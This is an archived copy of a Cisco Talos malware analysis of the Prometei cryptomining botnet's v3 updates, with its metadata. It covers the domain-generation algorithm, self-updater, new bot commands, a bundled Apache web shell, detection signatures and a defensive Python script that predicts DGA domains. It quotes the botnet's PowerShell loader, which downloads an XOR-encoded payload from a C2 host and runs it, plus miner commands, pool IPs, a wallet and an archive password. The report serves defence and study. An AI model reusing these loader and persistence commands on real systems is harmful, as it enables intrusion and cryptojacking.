{
    "id": "6b1bff60-ec11-4478-ae6a-c65e217d0fec",
    "created_at": "2023-05-06T02:09:27.786323Z",
    "updated_at": "2024-11-22T02:02:58.501328Z",
    "deleted_at": null,
    "sha1_hash": "c904247da693f3a44c66db428ebf63346b105c50",
    "title": "2023-03-09 - Prometei botnet improves modules and exhibits new capabilities in recent updates",
    "authors": "",
    "file_creation_date": "2023-05-05T01:50:49Z",
    "file_modification_date": "2023-05-05T01:50:49Z",
    "file_size": 1137307,
    "plain_text": "Prometei botnet improves modules and exhibits new\ncapabilities in recent updates\nblog.talosintelligence.com/prometei-botnet-improves/\nAndrew Windsor\n\nMarch 9, 2023\n\nBy Andrew Windsor, Vanja Svajcer\nThursday, March 9, 2023 08:03\nThreat Spotlight Threats\nPrometei botnet continued its activity since Cisco Talos first reported about it in 2020.\nSince November 2022, we have observed Prometei improving the infrastructure\ncomponents and capabilities. More specifically, the botnet operators updated certain\nsubmodules of the execution chain to automate processes and challenge forensic\nanalysis methods.\nWe assess with high confidence that v3 of the Prometei botnet is of medium size, with\nmore than 10,000 infected systems worldwide, based on data obtained by sinkholing\nthe DGA domains over a period of one week in February 2023.\nBased on open-source intelligence, the actors have also been actively spreading\nimproved Linux versions of the Prometei bot, continuously improving the current\nversion, v3.\nWe have observed previously undocumented functionality, including an alternative C2\ndomain generating algorithm (DGA), a self-updating mechanism, and a bundled\nversion of the Apache Webserver with a web shell that’s deployed onto victim hosts,\nimproving the overall technical capabilities of the botnet.\nAdditionally, the bot’s targeting may have been influenced by the war in Ukraine. The\nonly excluded country in the Tor configuration is Russia, as supposed to earlier\nvariants, which also avoided exit nodes in other CIS countries.\nPrometei, a highly modular botnet with worm-like capabilities that primarily deploys the\nMonero cryptocurrency miner, has been continuously improved and updated since it was\nfirst seen in 2016, posing a persistent threat to organizations. Talos first analyzed this threat\nin our 2020 blog post, highlighting its large repertoire of modules, multiple methods of\nspreading, and continuous development. In our initial analysis and current activity tracking\nthat began in November 2022, we observed Prometei deploying Windows-based tools and\nmalware and other Linux versions observed by security researchers.\n\n1/15\n\nTalos observed Prometei’s cryptocurrency mining and credential theft activity to be\nfinancially motivated and geographically indiscriminate. Its infections are likely opportunistic,\ntargeting vulnerable entities in all regions and industry verticals to support a higher yield of\nharvested credentials and mining of the Monero cryptocurrency.\nPrometei victimology\nWe assess with high confidence that the Prometei v3 botnet is of medium size, with\napproximately 10,000 infected systems worldwide, based on data acquired by sinkholing\nthe DGA domains over a period of one week in February.\nThe geographical distribution of infected systems shows a uniform distribution proportional\nto the population of the countries, with traffic captured from 155 countries. As expected with\na uniform distribution, the most populous countries have the largest number of infected\nsystems, with the exception of Brazil, Indonesia and Turkey displaying a higher proportion\nof infections compared to those countries’ populations.\nA single country that stands out is Russia, with a disproportionately smaller number of\ninfections, accounting for 0.31 percent of all infected systems, supporting our assessment\nof the bot’s targeting being influenced by the Russia-Ukraine conflict based on its Tor\nconfiguration.\n\nWe assess the Prometei threat remains ongoing and will evolve for the foreseeable future.\nIts common C2 infrastructure continues to show a steady stream of activity, while the\noperators consistently rotate its malware and cryptomining hosts. Their regular updating\nand expansion of Prometei’s modules demonstrate commitment and technical knowledge\n2/15\n\nthat will enable them to continue proliferating the botnet to new victims and adapting to new\ndefenses and protections. The noted addition of backdoor capabilities to sqhost.exe by our\nprevious research and the inclusion of a bundled web shell in our current observations\ncould indicate the operators are adding persistence measures to keep Prometei active on\ntargeted machines, or a gradual shift or expansion to other types of payloads and activity.\n\nUpdates to Prometei’s common execution chain demonstrate improved\ncapabilities\nTalos’ analysis of the botnet’s execution chain revealed that, while some infrastructure\ncomponents remain unchanged from our 2020 reporting, the Prometei operators have\nmade modifications that automate component and infrastructure updating, impair defenders’\nanalysis, and further entrench the actor on victim machines. We observed the execution\nchain and subsequent actions performed by the botnet were initiated by a malicious\nPowerShell command that downloaded the primary listening and execution module,\nreferred to throughout as “sqhost.exe.” It generally resembles some form of the following:\ncmd /C echo 123>C:\\Windows\\mshlpda32.dll&powershell $p='C:\\windows\\zsvc.exe';(NewObject Net.WebClient).DownloadFile('[C2_HOST]/k.php?B={PARAMS}',$p);$d=\n[IO.File]::ReadAllBytes($p);$t=New-Object Byte[]($d.Length);\n[int]$j=0;for([int]$i=0;$i -lt $d.Length;$i++){$j+=66;$t[$i]=(($d[$i] -bxor ($i*3 band 255))-$j) -band 255;}[io.file]::WriteAllBytes($p,$t);Start-Process $p;\n\nAs the above command illustrates, the primary module is downloaded from an actorcontrolled server in an encrypted form through a simple XOR byte alteration pattern. Its\ninitial location on the hard drive is “C:\\windows\\zsvc.exe” and is executed through the\nPowerShell cmdlet “Start-Process”.\n\nFollowing the primary module’s download, additional commands establish persistence on\nthe victim machine and ensure the bot can communicate with the C2 server. A firewall rule\nnamed “Secure Socket Tunneling Protocol (HTTP)” is executed through the “netsh”\ncommand to add “C:\\Windows\\sqhost.exe” to the allowed programs list. Persistence is\nobtained by creating an automated system service named “UPlugPlay,” which executes\nsqhost.exe with the argument “Dcomsvc”. The original downloaded file is then renamed\nfrom “zsvc.exe” to “sqhost.exe.”\nOnce the primary Prometei module is hooked into the victim’s system, the majority of its\ncapabilities are derived from several additional components that are downloaded to the\nvictim host and retrieved through additional PowerShell commands. This activity was\nobserved immediately following the establishment of sqhost.exe on the system. Many of the\nrest of Prometei’s components are delivered and updated in bulk through 7-Zip archive files.\n\n3/15\n\nThe bot first checks if the expected 7-Zip executable “7z.exe” and shared library “7z.dll”\nresources already exist on the system. If not, the executable file and shared library are\nremotely downloaded from a C2 server.\n\nUsing a similar PowerShell-based command, the bot downloads a 7z archive named\n“std.7z,” which contains numerous shared library files for some common development\npackages used by Prometei’s components, such as the GCC compiler (libgcc), an\nasynchronous event processor (libevent), the .NET Security interface, and a .NET\nconnector to PostgresSQL (npgsql). It also contains the following primary support modules:\n“rdpCIip.exe”\n“miwalk.exe”\n“windrlver.exe”\n“nethelper2.exe” and “nethelper4.exe”\n“smcard.exe”\n“msdtc.exe”\nTalos observed the primary support modules in the above list, which have consistently been\na part of previously observed instances of the Prometei botnet and a less frequently seen\nmodule named “bklocal.exe.” The file “rdpCIip.exe” (named with a capital ‘i’ rather than a\nlowercase ‘l’) acts as a spreader program through Server Message Block (SMB) and is\nused alongside its partner component “miwalk.exe”, which is a version of Mimikatz used for\ncredential harvesting. A remote desktop protocol (RDP)-based spreading module,\n\n4/15\n\n“bklocal2.exe” and “bklocal4.exe”, exploits the BlueKeep vulnerability (CVE-2019-0708) that\naffects older versions of Windows. This module has been deployed less frequently but can\nbe observed being downloaded separately.\nThe bot attempts to spread via SSH through the “windrLver.exe” SSH client. The\nexecutables with the “nethelper” names are .NET-based assemblies for lateral movement\nthat attempt to locate and connect to any SQL servers found in the network environment.\nUpon successful connection, the executables attempt to install sqhost.exe onto the server.\nThe final two modules, “smcard.ext” and “msdtc.exe”, deal with the bot’s communications\nover the Tor network, with the C2’s Tor address represented by the hardcoded URL in\nsqhost.exe and “onion” TLD: “hxxps://gb7ni5rgeexdcncj[.]onion/cgi-bin/prometei.cgi”.\nThe actual cryptocurrency mining payload is also retrieved remotely as “srch.7z”, but is\nwritten to disk as “SearchIndexer.exe”. The PowerShell command that downloads\nSearchIndexer.exe is similar to the one that drops the primary component sqhost.exe. First,\na check is performed that identifies if the same 7-Zip components are present on the\nsystem and downloads them if not. The encryption method to obfuscate SearchIndexer.exe\ndoes, however, differ. Rather than encrypting the payload through XOR byte manipulation, it\nis encrypted through its parent password-protected 7-Zip archive. The password\n“horhor123” is visible in the PowerShell command and remains unchanged from our\nprevious reporting. The miner configuration attributes are provided by the C2 through a\ndownloaded text file named “desktop.txt”, written to disk at “C:\\Windows\\dell\\desktop.dat”.\nWe also observed a few actions related to the miner. The call to actually begin mining can\nbe seen in SearchIndexer.exe’s invocation on the command line, which also contains the\nMonero wallet associated with the Prometei actor:\nsearchindexer.exe -o stratum+tcp://103.65.236[.]53:80 -u\n4A1txQ9L8h8NqF4EtGsZDP5vRN3yTVKynbkyP1jvCiDajNLPepPbBdrbaqBu8fCTcFEFdCtgbekSsTf17B1M\nhyE2AKCEyfR -p x --donate-level 1\n\nThe actor issues commands to replace the command template in desktop.dat with a newly\nidentified base64-encoded command. Two commands we observed were:\npowershell.exe $d=\n[System.Convert]::FromBase64String('LW8gc3RyYXR1bSt0Y3A6Ly8yMjEuMTIwLjE0NC4xMDE6MzMz\nMyAtLWRvbmF0ZS1sZXZlbCAxIC1wIHggLXUgaWQ=');\n[io.file]::WriteAllBytes('C:\\Windows\\dell\\Desktop.dat',$d);\n“-o stratum+tcp://221.120.144[.]101:3333 --donate-level 1 -p x -u id”\nand\npowershell.exe $d=\n[System.Convert]::FromBase64String('LW8gc3RyYXR1bSt0Y3A6Ly8xNzcuNzMuMjM3LjU1OjgwIC0t\nZG9uYXRlLWxldmVsIDEgLXAgeCAtdSBpZA==');\n[io.file]::WriteAllBytes('C:\\Windows\\dell\\Desktop.dat',$d);\n“-o stratum+tcp://177.73.237[.]55:80 --donate-level 1 -p x -u id”\n\n5/15\n\nThe purpose and usage of all of the submodules were analyzed more in-depth in Talos’\n2020 blog post and by security firm Cybereason in April 2021. They are summarized above\nfor the sake of brevity. For a lengthier technical breakdown of these components and\ncommonly observed Prometei execution chain, we recommend referring back to these\nreports.\n\nNewly identified TTPs show operators’ continuous efforts to improve the\nbotnet\nTalos identified new Prometei TTPs that expand the botnet’s capabilities and, at the time of\nwriting, have yet to be highlighted in open-source reporting. This recent addition of new\ncapabilities aligns with threat researchers’ previous assertions that the Prometei operators\nare continuously updating the botnet and adding functionality. In particular, Talos has\ndiscovered and analyzed a domain generation algorithm previously unseen in Prometei, the\naddition of a self-updating mechanism, new bot commands that can be used and the\ndeployment of a bundled version of the Apache Webserver with a PHP-based web shell\nonto victim hosts.\nDomain-generating algorithm for alternative C2\nTalos observed a new functionality that generates pseudo-random-looking domains. A\nsimple domain-generating algorithm (DGA) is used to generate up to 48 new domains per\nday that can be used for command and control (C2) servers.\nThe domain name itself is generated from the string “xinchao”, followed by six pseudorandom characters based on the current local date. Additionally, the suffix of the top-level\ndomains (TLD) is rotated between .com, .net, and .org. For example, we observed some of\nthe following used in nslookup calls within telemetry:\nxinchaodbcdbh[.]org\nxinchaodbcdbh[.]com\nxinchaoabcdcf[.]org\nxinchaocecclk[.]org\nxinchaocecclk[.]net\n\nWe have included a simple Python script to help with discovering domains that Prometei v3\nwill generate. The script takes a date in ISO format as an input and generates 48 possible\ndomains for that date.\n\n6/15\n\nApart from the standard DNS resolver for the generated domains, the “nslookup” command\nwas executed with a pattern-generated domain name, as well as with a server parameter\n“8[.]8.8.8” in order to specifically use Google’s public DNS. This call is visible on the\ncommand line as follows:\nnslookup -type=all xinchaocecclk[.]com 8[.]8.8.8\n\n7/15\n\nA side effect of this is that nslookup calls act as a timing delay tactic that's relatively obscure\nto general users auditing their command logs. When the aforementioned domains are used\nwith the nslookup command, the lookup essentially causes a timeout when it is unable to\nresolve the IP address.\nSelf-updating mechanism\nAnother evolution of the Prometei botnet is what appears to be an expanded self-updating\ncapability. The bot issues a PowerShell command with embedded base64-encoded bytes,\nwhich is written to the batch file in the bot’s common directory at\n“C:\\Windows\\dell\\walker_updater.cmd” and then executed. This batch file will run similar\nchecks as seen in the previous activity that looks for the presence of “sqhost.exe” and the\n7-Zip utilities and downloads them if they aren’t detected. The batch script also issues\nadditional PowerShell commands to download a 7z file from the C2 server named\n“update.7z”, which is encrypted with the common actor password “horhor123”. Its contents\nare extracted and another contained batch file, “install.cmd”, is executed.\nThe update.7z archive contains replications as well as potentially different variants of\nPrometei’s common components, such as sqhost.exe, netwalker.exe, and the service\nconfiguration “uplugplay”, among others. It also contains two 7-Zip archives named\n“updates1_new” and “updates2_new”, which are encoded with a new password string\n“xinchao123” similar in composition to the aforementioned DGA domain generation. Further\nextracting these archives yields duplicate and different versions of the shared library files\nand spreader programs, depending on which version of the archive is downloaded. For\nexample, in a later update call from a different C2, Talos observed a 32-bit and 64-bit\nversion of the Mimikatz variant “miWalk” included, while some subsequent downloads of the\nupdate archive only included the 64-bit version.\nThe install.cmd batch file, invoked by the parent batch file walker_update.cmd, is a fairly\nstraightforward delete-substitution update of the relevant files. In the samples analyzed, the\nscript first attempts to kill the rdpCIip.exe and winDrLver.exe spreader programs. It then\ndeletes all current versions of the target files on disk and then renames the extracted\nversions, which contain an additional appendage of “_new” to their filename, the same as\nthe deleted files effectively supplanting them. Finally, the install.cmd script cleans up any\nremaining extracted files from update.7z not used in the update cycle.\nPreviously undocumented Prometei bot commands\nApart from the C2 commands that are already described in detail in other posts, version 3 of\nthe Prometei bot contains several previously undocumented commands that the adversary\ncould use to control the infected system.\nCommand\n\nFunctionality\n\n8/15\n\nfchk\n\nCheck if a file is locked by a process and the file’s owner.\n\nfget\n\nUpload a file to c2\n\nfdir\n\nGet current directory\n\ncall\n\nExecute a program, create pipes to redirect stdin and stdout for input and\noutput.\n\nsendstr\n\nSend a supplied argument string into the keyboard input buffer\n\ndclick\n\nMouse double click on a screen position\n\nlclick\n\nMouse left click on a screen position\n\nrclick\n\nMouse right click on a screen position\n\nclipcopy\n\nGet clipboard data\n\nclipsend\n\nSet clipboard data\n\nwinr\n\nPress win+r, open run box\n\npresskey\n\nPress a virtual keyboard key\n\nfdel\n\nDelete file\n\nfsha256\n\nCalculate sha256 checksum of a file\n\nThe execution flow for the main module is very similar to previous variants. The main body\nof the bot is encrypted and the initialization of the encryption keys is dependent on the\ncontent of an external file created prior to the main module execution. If the initialization is\nsuccessful, the main body of the bot will be executed, and if it fails, a decoy functionality will\nbe executed.\n\n9/15\n\nSuccessful execution of the bot depends on the content of an external file.\nApache webserver/web shell\nFinally, Talos observed the Prometei bot dropping a compressed archive, named\n“AppServ180.zip”, which contains a version of the Apache Web Server bundled with a\nsimple PHP-based web shell. Similar to other component downloads by Prometei, the\nPowerShell call that drops this piece checks for the existence of 7-Zip before downloading\nAppServ180.zip from an actor-controlled host. The script then creates the following\ndirectories: “C:\\ProgramData\\Microsoft\\AppServ” and\n“C:\\ProgramData\\Microsoft\\AppServ\\cgi-bin”.\n\nInstallation of Apache web server and the PHP web shell file.\n\nIn a separate PowerShell command, the PHP file,\n“C:\\ProgramData\\Microsoft\\AppServ\\www\\ssimple.php”, is renamed to a new filename\nconsisting of “Shell-” and 12 randomly generated alphanumeric characters plus “.php”. This\nPHP file contains the simple web shell code that receives base64-encoded commands\nexecuted through PHP’s “system” function and a file upload-copy ability.\n\n10/15\n\nInstalled web shell PHP code.\nAn additional Windows service is created under the name “KtmRmSvc” consisting of an\nauto process start for the executable in the AppServ subdirectory\n“Apache2.2\\bin\\taskhost.exe”. Despite its shared naming of a common Windows system\nexecutable, this file is actually a renamed “httpd.exe”, which is the HTTP daemon for the\nApache Server. By renaming the Apache daemon to a common system file, it is highly likely\nthat the actor managing Prometei is hoping to prevent system owners and admins from\nnoticing a web server running on their host through some simplistic obfuscation of the\nrunning process name. While the inclusion of the packaged web shell was observed in the\nactivity starting on Nov. 19, 2022, the existence of the archive file itself was first seen in\nVirusTotal on March 3, 2021, when its only submission was provided by a user in Japan.\nGiven the Prometei actor’s propensity to swap components in and out, as well as iteratively\nupdate them, it is probable that the actor may have been testing their web shell and/or\ndeploying it situationally in other infection attempts, but we do not currently have any direct\nevidence to confirm or refute this.\n\nPrometei targeting now only excludes Russia\nIn analyzing our updated version of Prometei’s Tor proxy, “msdtc.exe”, we observed this\nconfiguration has been recently updated to only exclude Russia, a change potentially made\nin response to the Russia-Ukraine war. In Cybereason’s 2021 reporting, their researchers\nsuggested that Prometei could be Russia-based, as the actor had configurations that\nexcluded Tor exit nodes from Russia, Ukraine, Belarus, and Kazakhstan. Our recent\nanalysis not only corroborates Cybereason’s assessment that the operators are Russiabased but highlights a shift in Prometei’s current observed behavior.\n\n11/15\n\nMsdtc.exe Tor connection module contains configuration to exclude Russian exit nodes.\nPrior to Russia’s invasion of Ukraine, the actor avoided targeting Russia and many of its\nborder states, whereas now, they only avoid targeting Russia. This may indicate a desire to\nlimit the infection of and/or communication to any Russian hosts by the botnet’s author, and\nthat previously excluded border states are now fair game.\n\nCoverage\nWays our customers can detect and block this threat are listed below.\n\nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the\nexecution of the malware detailed in this post. Try Secure Endpoint for free here.\nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by\nthreat actors as part of their campaign. You can try Secure Email for free here.\nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances\nsuch as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect\nmalicious activity associated with this threat.\nCisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network\ntraffic automatically and alerts users of potentially unwanted activity on every connected\ndevice.\nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds\nprotection into all Cisco Secure products.\n\n12/15\n\nUmbrella, Cisco’s secure internet gateway (SIG), blocks users from connecting to malicious\ndomains, IPs and URLs, whether users are on or off the corporate network. Sign up for a\nfree trial of Umbrella here.\nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks\npotentially dangerous sites and tests suspicious sites before users access them.\nAdditional protections with context to your specific environment and threat data are\navailable from the Firewall Management Center.\nCisco Duo provides multi-factor authentication for users to ensure only those authorized are\naccessing your network.\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the\nlatest rule pack available for purchase on Snort.org.\nThe following Snort SIDs can defend against this threat: 54610 - 54612 and 61426-61429.\nThe following ClamAV signatures are applicable to this threat:\nWin.Trojan.MSShellcode-6\nWin.Coinminer.Generic-7151250-0\nWin.Malware.Tgqv7oji-9939403-0\nWin.Trojan.Mimikatz-6466236-0\nWin.Trojan.Prometei-8977166-0\n\nATT&CK Techniques\nResource Development\nT1584.005 Compromise Infrastructure: Botnet\nExecution\nT1059.001 Command and Scripting Interpreter: PowerShell\nT1569.002 System Services: Service Execution\nPersistence\nT1505.003 Server Software Component: Webshell\nEvasion\nT1027 Obfuscated Files or Information\n\n13/15\n\nT1036 Masquerading\nT1070.004 Indicator Removal on Host: File Deletion\nT1140 Deobfuscate/Decode Files or Information\nT1562 Impair Defenses\nLateral Movement\nT1210 Exploitation of Remote Services\nCommand and Control\nT0884 Connection Proxy\nT1090.003 Proxy: Multi-hop Proxy\nT1105 Ingress Tool Transfer\n\nIndicators of Compromise\nIndicators of Compromise associated with this threat can be found here.\n\nPrometei DGA script\n\n14/15\n\n#!/usr/bin/env python3\nfrom datetime import datetime\nimport sys\ndef genPrometeiDomains (basedate=datetime.now(), basestring='xinchao'):\nmonth = basedate.strftime(\"%m\")\nday_year = basedate.strftime(\"%d%y\")\nbasedomain=''\ngenerateddomains=[]\nfor i in range(len(day_year)):\nbasedomain=basedomain+chr(ord(day_year[i]) + 0x31)\nbasedomain=basedomain+chr(int(month)+0x61)\nfor i in range(16):\nfor tld in ['.net','.org','.com']:\ndomain=basestring+basedomain+chr(i + 0x61)\ngenerateddomains.append(domain+tld)\n\nreturn '\\n'.join(generateddomains)\n\nif __name__ == \"__main__\":\ntry:\nprint(genPrometeiDomains(datetime.fromisoformat(sys.argv[1])))\nexcept IndexError:\nprint(genPrometeiDomains())\nexcept ValueError:\nprint(\"The date must be specified using the ISO format yyyy-mm-dd\")\n\n15/15",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-09 - Prometei botnet improves modules and exhibits new capabilities in recent updates.pdf"
    ],
    "report_names": [
        "2023-03-09 - Prometei botnet improves modules and exhibits new capabilities in recent updates.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1683338967786,
    "ts_updated_at": 1732240978501,
    "ts_creation_date": 1683251449000,
    "ts_modification_date": 1683251449000,
    "files": {
        "pdf": "https://archive.orkl.eu/c904247da693f3a44c66db428ebf63346b105c50.pdf",
        "text": "https://archive.orkl.eu/c904247da693f3a44c66db428ebf63346b105c50.txt",
        "img": "https://archive.orkl.eu/c904247da693f3a44c66db428ebf63346b105c50.jpg"
    }
}